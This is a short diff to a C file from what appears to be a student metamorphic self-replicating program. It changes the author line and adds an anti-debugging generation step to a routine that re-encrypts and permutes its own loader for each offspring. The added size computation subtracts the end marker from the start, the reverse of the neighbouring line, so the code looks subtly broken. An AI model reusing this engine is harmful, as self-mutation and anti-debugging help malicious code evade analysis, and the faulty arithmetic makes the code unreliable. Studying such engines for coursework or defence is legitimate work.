@@ -3,7 +3,7 @@
 /*                                                        :::      ::::::::   */
 /*   metamorph_self.c                                   :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
-/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
+/*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
 /*   Updated: 2019/12/20 23:14:27 by anselme          ###   ########.fr       */
@@ -47,10 +47,12 @@ bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2], uint64_t client_id)
 
 	size_t	cypher_size = (size_t)cypher_end - (size_t)cypher;
 	size_t	loader_size = return_to_client - mark_below; // tmp size
+	size_t	anti_debug_size = (size_t)anti_debug - (size_t)anti_debug_end;
 
 	if (!generate_cypher((void *)cypher, unique_seed, cypher_size)
 	|| !generate_decypher((void *)decypher, unique_seed, cypher_size)
 	|| !permutate_instructions(mark_below, unique_seed, loader_size)
+	|| !generate_anti_debug((void *)anti_debug, son_seed[0], anti_debug_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, _ERR_METAMORPH_SELF);
 
